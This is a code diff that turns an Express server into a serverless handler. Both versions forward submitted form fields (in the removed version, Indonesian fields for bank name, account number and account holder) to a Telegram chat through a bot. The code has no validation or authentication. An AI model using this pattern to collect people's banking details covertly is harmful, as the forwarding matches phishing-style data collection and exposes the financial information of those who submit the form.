@@ -1,49 +1,30 @@
-import express from "express";
-import multer from "multer";
-import fetch from "node-fetch";
-import dotenv from "dotenv";
+export default async function handler(req, res) {
+  if (req.method !== "POST") {
+    return res.status(405).json({ message: "Method Not Allowed" });
+  }
 
-dotenv.config();
+  try {
+    const data = req.body;
 
-const app = express();
-const upload = multer({ dest: "uploads/" });
+    let text = "📥 DATA MASUK\n\n";
+    for (const k in data) {
+      text += `${k.toUpperCase()} : ${data[k]}\n`;
+    }
 
-app.post("/api/submit", upload.single("filename"), async (req, res) => {
-    const {
-        id_pengirim,
-        nickname,
-        jumlah_bongkaran,
-        bank_pencairan,
-        nomor_rekening,
-        atas_nama
-    } = req.body;
+    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-    const message = `
-📥 SUBMIT DATA BARU
-
-🆔 ID Pengirim: ${id_pengirim}
-👤 Nickname: ${nickname}
-💰 Jumlah: ${jumlah_bongkaran}
-
-🏦 Bank: ${bank_pencairan}
-💳 Rekening: ${nomor_rekening}
-👥 Atas Nama: ${atas_nama}
-`;
-
-    const telegramURL = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;
-
-    await fetch(telegramURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: process.env.CHAT_ID,
-            text: message
-        })
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: process.env.CHAT_ID,
+        text
+      })
     });
 
-    res.json({ success: true });
-});
-
-app.listen(3000, () => {
-    console.log("Server running on http://localhost:3000");
-});
+    res.status(200).json({ status: "ok" });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ status: "error" });
+  }
+}
